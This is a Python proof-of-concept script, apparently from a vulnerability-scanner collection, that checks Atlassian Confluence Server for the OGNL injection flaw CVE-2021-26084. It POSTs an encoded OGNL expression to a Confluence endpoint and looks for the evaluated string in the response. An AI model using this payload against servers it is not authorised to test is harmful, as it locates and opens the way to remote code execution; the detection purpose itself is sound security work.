# title: Atlassian Confluence Server
# cve: CVE-2021-26084
# link: http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202108-2421
# author: itmeng
# use:
#   python atlassian-cve-2021-26084.py

from poctools import BasicPoc

class AtlassianConfluenceServerConsolePoc(BasicPoc):

    path = "/pages/doenterpagevariables.action"
    payload = "queryString=aaa%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D%7D%2B%5Cu0027bbb"
    validate = "aaa{class java.lang.String=null}bbb"
    

    def __init__(self):
        super(AtlassianConfluenceServerConsolePoc, self).__init__()
        self.name = "AtlassianConfluence任意命令执行"
    
    def verify(self, url):
        self.set_headers({"Content-Type": "application/x-www-form-urlencoded"})
        response = self.post(url+self.path, data=self.payload)
        if response is None:
            return False
        return self.validate in response.text


if __name__ == '__main__':
    target = "127.0.0.1:1990"
    poc = AtlassianConfluenceServerConsolePoc()
    result = poc.run(target)
    print(f"{target} -> {result}")
